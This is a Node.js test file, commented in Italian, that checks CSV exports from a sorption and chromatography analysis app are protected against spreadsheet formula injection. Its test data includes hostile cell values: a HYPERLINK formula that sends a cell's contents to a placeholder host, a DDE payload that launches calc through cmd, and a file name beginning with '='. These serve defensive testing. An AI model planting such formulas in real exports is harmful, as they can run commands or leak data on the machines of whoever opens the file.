// SPDX-FileCopyrightText: 2026 Lorenzo Birindelli
// SPDX-License-Identifier: GPL-3.0-or-later
// CSV injection (debug della conclusione): testi che vengono da un file (nome, titolo, adsorbato di un AIF) non devono diventare
// formule di Excel in nessun CSV esportato. Prima della correzione concentrazioni_da_libreria.csv, la carta di controllo e i CSV del
// fisisorbimento e del chemisorbimento scrivevano «=1+2.csv» o «+1+HYPERLINK(…)» senza l'apostrofo che csvCell mette negli altri CSV.
'use strict';
const test=require('node:test'), assert=require('node:assert'), fs=require('fs'), path=require('path');
const B=require('./browser.js'), D=require('./i4-dati.js'), JSZip=require(path.join(B.ROOT,'node_modules','jszip'));
let server, browser;
test.before(async ()=>{ server=await B.startServer(); browser=await B.launch(); });
test.after(async ()=>{ await browser.close(); server.close(); });
const FORMULA=/(^|;|,)"?[=+\-@](?![\d.,]+(;|,|$))/;   // una cella che inizia con = + - @ e non è un numero

test('fisisorbimento: un adsorbato ostile in un file AIF esce neutralizzato nel CSV', async ()=>{
  const {p,ctx,errors}=await B.openPage(browser, server, {}); const PAY='+1+HYPERLINK("http://example.invalid/?"&A1,"clic")';
  const aif=fs.readFileSync(path.join(B.ROOT,'test','fixtures','sorption','isoterma.aif'),'utf8').replace(/_exptl_adsorptive .*/, "_exptl_adsorptive '"+PAY+"'");
  const r=await p.evaluate(async ([aif])=>{ await addEntries([{file:new File([aif],'ostile.aif'),path:'ostile.aif'}]); document.querySelectorAll('dialog[open]').forEach(d=>d.close());
    const f=files.find(x=>x.iso); return {line:AcchSorp.csvText(f).split('\r\n').find(l=>l.includes('HYPERLINK'))}; }, [aif]);
  assert.ok(r.line && r.line.includes("\"'+1+HYPERLINK("), r.line); assert.deepStrictEqual(errors, []); await ctx.close();
});

test('concentrazioni da libreria: nome del file e titolo ostili escono neutralizzati come negli altri CSV', async ()=>{
  const o=await B.openPage(browser, server, {}), NAME='=1+2.csv', LIBNAME='Agilent 1260 Infinity · DAD — saliva';
  await o.p.evaluate(()=>AcchLibUi.openManager()); await o.p.waitForSelector('#lmImport'); await o.p.setInputFiles('#lmFile', path.join(B.ROOT,'examples','librerie','saliva-hplc-dad220.bozza.json'));
  await o.p.waitForFunction(n=>AcchLibUi.items.some(it=>it.lib && it.lib.name===n), LIBNAME); await o.p.evaluate(()=>document.querySelectorAll('dialog[open]').forEach(d=>d.close()));
  const txt=D.chrom({sample:'SAL_03', method:'C:\\Chem32\\1\\METHODS\\ICCOM-SAL-RP220.M', peaks:[[3.561,9876,0.0227],[5.358,12773,0.15]].map(([t,b,c])=>({t, area:b*c}))});
  await o.p.evaluate(async ([n,t])=>{ await addEntries([{file:new File([t],n), path:n}]); await new Promise(r=>setTimeout(r,250)); }, [NAME, txt]);
  await o.p.fill('#lpSt','saliva'); await o.p.dispatchEvent('#lpSt','input'); await o.p.click('#lpOk');
  await o.p.waitForFunction(n=>{ const f=files.find(g=>g.name===n); return f && f.an && f.an.lib && f.an.lib.insOk; }, NAME);
  await o.p.evaluate(()=>{ files[0].title='@SUM(1+1)*cmd|\' /C calc\'!A0'; persist(files[0]); Object.assign(S,{outPdf:false,outAnalysis:true,outPng:false,outSvg:false,csvPeaks:true,csvData:false,csvRaw:false,outOrig:false,outTrace:false,outOrigin:false,outProject:false,expSub:false,expScope:'all',zipAll:true}); saveS(); syncControls(); go(3); renderSummary(); });
  const [dl]=await Promise.all([o.p.waitForEvent('download',{timeout:60000}), o.p.click('#doDl')]);
  const z=await JSZip.loadAsync(fs.readFileSync(await dl.path())); let seen=0;
  for (const n of Object.keys(z.files).filter(n=>/\.csv$/.test(n))){ const t=(await z.file(n).async('string')).replace(/^\uFEFF/,'');
    for (const l of t.split(/\r\n/).filter(l=>/=1\+2|@SUM/.test(l))){ seen++; assert.doesNotMatch(l, FORMULA, n+': '+l.slice(0,120)); } }
  assert.ok(seen>=2, 'righe con i testi ostili trovate: '+seen); assert.deepStrictEqual(o.errors, []); await o.ctx.close();
});
